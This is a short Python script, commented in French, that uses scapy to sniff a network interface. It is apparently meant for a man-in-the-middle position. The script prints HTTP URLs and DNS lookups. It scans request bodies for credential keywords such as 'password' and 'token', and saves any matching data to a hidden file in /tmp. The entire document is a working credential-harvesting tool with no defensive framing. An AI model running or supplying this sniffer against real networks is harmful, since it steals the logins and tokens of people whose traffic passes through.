import scapy.all as scapy
from scapy.layers import http
import re

LOG_FILE = "/tmp/.mitm_log.txt"

def analyser_paquet(paquet):
    """Analyse chaque paquet intercepté"""


    if paquet.haslayer(http.HTTPRequest):
        url = paquet[http.HTTPRequest].Host.decode() + \
              paquet[http.HTTPRequest].Path.decode()

        print(f"\n[HTTP] {url}")


        if paquet.haslayer(scapy.Raw):
            corps = paquet[scapy.Raw].load.decode(errors="ignore")
            mots_cles = ["user", "pass", "login", "email",
                         "username", "password", "pwd", "token"]
            if any(mot in corps.lower() for mot in mots_cles):
                print(f"[!] CREDENTIALS DÉTECTÉS :\n    {corps}")
                with open(LOG_FILE, "a") as f:
                    f.write(f"URL: {url}\nDATA: {corps}\n{'─'*40}\n")


    if paquet.haslayer(scapy.DNSQR):
        domaine = paquet[scapy.DNSQR].qname.decode()
        if not domaine.endswith(".local."):
            print(f"[DNS] {domaine}")

def lancer(interface="eth0"):
    print(f"[*] Sniffing sur {interface} — Ctrl+C pour arrêter")
    scapy.sniff(
        iface=interface,
        store=False,
        prn=analyser_paquet
    )

if __name__ == "__main__":
    import sys
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    lancer(iface)